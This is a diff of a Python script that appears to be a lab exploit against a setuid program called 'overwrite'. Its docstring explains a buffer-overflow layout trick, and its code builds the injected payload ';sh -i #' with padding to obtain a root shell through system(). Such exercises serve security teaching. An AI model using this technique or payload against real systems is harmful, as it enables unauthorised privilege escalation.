@@ -24,10 +24,16 @@
 
 def main():
 	"""
-		Need to craft such an input
-		that will overflow a[256]
-		and in return let us gain a 
-		brand-new root shell by executing the magic!
+		When one checks the disassembled version of 'overwrite' s/he can see
+		that there are 2 array allocated consecutively as long one and then the short one
+		but since compiler loves optimization a lot it allocates these as short one then the long one.
+		Therefore we have a[256] then b[1024] consecutively. Program executes the content of a[256] + b[1024] as root
+		namely it has setuid bit set and calls the 'system(concatenated_ab)' function. If we were to craft such an
+		input that will first fill a[256] then overflow it so that b[1024]'s first character gets a null character '\0'
+		(i.e. b[0]='\0') and 'strlen(b)' will terminate the loop and directly jump below.
+
+		So in below we craft and input that executes our command and then pads the remaining space accordingly to make
+		b[0] = '\0'
 	"""
 	magic = ";sh -i #"
 	padding = '0' * (216 - (len(magic) + 1))
